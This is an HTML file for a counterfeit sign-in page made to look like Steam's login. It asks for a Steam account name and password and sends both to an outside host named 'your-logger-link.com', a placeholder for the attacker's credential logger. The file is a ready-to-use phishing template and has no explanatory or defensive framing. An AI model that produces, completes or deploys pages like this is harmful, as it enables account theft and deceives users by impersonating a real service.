<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In</title>
    <style>
        body { font-family: Arial, Helvetica, sans-serif; background-color: #1b2838; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #c7d5e0; }
        .login-box { background: #171a21; padding: 30px; border-radius: 3px; width: 350px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
        h2 { color: #fff; text-align: center; font-weight: normal; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #b8b6b4; margin-bottom: 5px; }
        input { width: 100%; padding: 10px; background: #111; border: 1px solid #000; border-radius: 2px; color: #fff; box-sizing: border-box; font-size: 14px; }
        input:focus { border-color: #66c0f4; outline: none; }
        .btn { background: linear-gradient(to bottom, #75b022, #588a1b); color: #d2e885; border: none; width: 100%; padding: 10px; border-radius: 2px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; text-shadow: 1px 1px 0px rgba(0,0,0,0.3); }
        .btn:hover { background: linear-gradient(to bottom, #8ed629, #6aab1f); color: #fff; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign In</h2>
        <form action="https://your-logger-link.com" method="POST">
            <div class="input-group">
                <label>Steam Account Name</label>
                <input type="text" name="username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
        </form>
    </div>
</body>
</html>
